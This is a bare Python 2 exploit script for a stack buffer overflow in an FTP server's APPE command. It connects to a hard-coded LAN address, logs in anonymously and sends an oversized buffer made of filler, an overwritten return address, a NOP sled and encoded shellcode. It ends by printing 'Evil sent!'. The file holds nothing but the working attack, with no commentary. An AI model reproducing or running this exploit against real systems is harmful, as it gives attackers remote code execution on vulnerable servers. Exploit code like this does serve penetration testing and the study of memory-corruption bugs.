#!/usr/bin/python

from socket import *
import sys, struct, os, time

host = "192.168.86.151"
port = 21

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(2000)
time.sleep(2)


sc = ("\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x17"
      "\xd9\x94\xbf\x83\xeb\xfc\xe2\xf4\xeb\x31\x16\xbf\x17\xd9"
      "\xf4\x36\xf2\xe8\x54\xdb\x9c\x89\xa4\x34\x45\xd5\x1f\xed"
      "\x03\x52\xe6\x97\x18\x6e\xde\x99\x26\x26\x38\x83\x76\xa5"
      "\x96\x93\x37\x18\x5b\xb2\x16\x1e\x76\x4d\x45\x8e\x1f\xed"
      "\x07\x52\xde\x83\x9c\x95\x85\xc7\xf4\x91\x95\x6e\x46\x52"
      "\xcd\x9f\x16\x0a\x1f\xf6\x0f\x3a\xae\xf6\x9c\xed\x1f\xbe"
      "\xc1\xe8\x6b\x13\xd6\x16\x99\xbe\xd0\xe1\x74\xca\xe1\xda"
      "\xe9\x47\x2c\xa4\xb0\xca\xf3\x81\x1f\xe7\x33\xd8\x47\xd9"
      "\x9c\xd5\xdf\x34\x4f\xc5\x95\x6c\x9c\xdd\x1f\xbe\xc7\x50"
      "\xd0\x9b\x33\x82\xcf\xde\x4e\x83\xc5\x40\xf7\x86\xcb\xe5"
      "\x9c\xcb\x7f\x32\x4a\xb1\xa7\x8d\x17\xd9\xfc\xc8\x64\xeb"
      "\xcb\xeb\x7f\x95\xe3\x99\x10\x26\x41\x07\x87\xd8\x94\xbf"
      "\x3e\x1d\xc0\xef\x7f\xf0\x14\xd4\x17\x26\x41\xd5\x1f\x80"
      "\xc4\x5d\xea\x99\xc4\xff\x47\xb1\x7e\xb0\xc8\x39\x6b\x6a"
      "\x80\xb1\x96\xbf\x06\x85\x1d\x59\x7d\xc9\xc2\xe8\x7f\x1b"
      "\x4f\x88\x70\x26\x41\xe8\x7f\x6e\x7d\x87\xe8\x26\x41\xe8"
      "\x7f\xad\x78\x84\xf6\x26\x41\xe8\x80\xb1\xe1\xd1\x5a\xb8"
      "\x6b\x6a\x7f\xba\xf9\xdb\x17\x50\x77\xe8\x40\x8e\xa5\x49"
      "\x7d\xcb\xcd\xe9\xf5\x24\xf2\x78\x53\xfd\xa8\xbe\x16\x54"
      "\xd0\x9b\x07\x1f\x94\xfb\x43\x89\xc2\xe9\x41\x9f\xc2\xf1"
      "\x41\x8f\xc7\xe9\x7f\xa0\x58\x80\x91\x26\x41\x36\xf7\x97"
      "\xc2\xf9\xe8\xe9\xfc\xb7\x90\xc4\xf4\x40\xc2\x62\x64\x0a"
      "\xb5\x8f\xfc\x19\x82\x64\x09\x40\xc2\xe5\x92\xc3\x1d\x59"
      "\x6f\x5f\x62\xdc\x2f\xf8\x04\xab\xfb\xd5\x17\x8a\x6b\x6a")

buffer =  "\x41" * 965
buffer += "\xed\x1e\x94\x7c"
buffer += "\x90" * 50 + sc
buffer += "\x43" * 140
buffer += "\r\n"

print "[+] length: %d" % (len(buffer))

s.send('USER ftp\r\n')
print s.recv(2000)
s.send('PASS ftp\r\n')
print s.recv(2000)
s.send('APPE ' + buffer)
print s.recv(2000)
print "[+] Evil sent!"

s.close()